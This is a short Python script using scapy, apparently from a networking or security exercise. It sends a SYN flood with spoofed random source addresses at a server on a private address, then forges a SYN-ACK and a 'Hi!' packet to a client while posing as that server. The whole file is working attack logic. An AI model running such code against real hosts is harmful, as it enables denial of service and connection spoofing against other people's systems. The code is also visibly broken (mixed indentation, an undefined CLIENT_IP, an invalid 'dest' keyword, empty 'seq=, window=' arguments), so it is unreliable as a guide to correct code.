from scapy.all import *
import random

def syn_flood(target_ip, target_port):
    FLOOD_COUNT = 10000000
    packet_sent = 0

	for _ in range(FLOOD_COUNT):
        ip = IP()
        addr = [str(random.randint(0,255)) for _ in range(4)]
		ip.src = '.'.join(addr)
		ip.dst = target_ip
		tcp = TCP()
		tcp.sport = random.randint(1000, 9000)
		tcp.dport = target_port
		tcp.flags = "S" # syn packet
		tcp.seq = random.randint(1000, 9000) # random sequence number
		tcp.window = random.randint(1000, 9000) # random window size

		send(ip/tcp, verbose=0) # send the packet
		packet_sent += 1

	print(packet_sent + ' packets sent')

if __name__ == '__main__':
	SERVER_PORT = 8282
	SERVER_IP = '192.168.1.11'
    CLIENT_PORT = 51462
    # flood the real server
    syn_flood(SERVER_IP, SERVER_PORT)

    # send syn ack to client with server ip port
    ip = IP(dest=CLIENT_IP, src=SERVER_IP)
    tcp = TCP()
    tcp.sport = SERVER_PORT
    tcp.dport = CLIENT_PORT
    tcp.flags = "SA" # syn ack packet
    # sequence number and window size according to the client syn packet
    tcp.seq = 3723330155
    tcp.window = 29200

    send(ip/tcp) # send the packet

    # talk to client
    ip = IP(dest=CLIENT_IP, src=SERVER_IP)
    tcp = TCP(sport=SERVER_PORT, dport=CLIENT_PORT, seq=, window=)
    send(ip/tcp/Raw(load='Hi!'))
